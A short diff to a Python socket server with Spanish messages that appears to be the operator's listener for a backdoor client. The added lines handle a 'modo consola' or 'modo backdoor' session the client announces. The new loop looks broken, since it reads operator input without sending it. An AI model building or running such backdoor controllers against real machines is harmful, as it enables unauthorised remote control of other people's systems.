@@ -10,11 +10,14 @@ if __name__ == '__main__':
 	print("Conexión establecida: {}".format(addr))
 	while True:
 		mensaje = conn.recv(1024).decode()
-		print("El cliente ha enviado: {}".format(mensaje))
-		resp = input("Responder: ")
+		print(">> {}".format(mensaje))
+		resp = input("> ")
 		if resp == "exit":
 			server.close()
 			exit()
+		if "Se ha iniciado el modo consola, para salir escriba:" in mensaje:
+			while mensaje != "Se ha cerrado el modo backdoor.":
+				mensaje = conn.recv(1024).decode()
+				resp = input(">>>")
 		else:
 			conn.send(resp.encode())
-
